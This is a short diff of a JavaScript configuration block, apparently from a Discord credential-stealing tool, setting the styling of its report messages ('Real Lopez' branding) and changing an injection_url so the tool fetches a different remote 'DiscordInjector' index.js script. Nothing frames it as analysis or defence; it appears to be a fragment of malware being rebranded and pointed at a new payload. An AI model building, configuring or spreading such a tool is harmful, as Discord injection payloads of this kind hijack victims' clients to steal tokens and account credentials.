@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Real Lopez', 
   embed_icon: 'https://media.discordapp.net/attachments/1172720511525064816/1174175771787530290/6690616208f98d35b6a66fb129793cf1.webp'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/reallopez/DiscordInjector/main/index.js', 
   /**
    
    **/
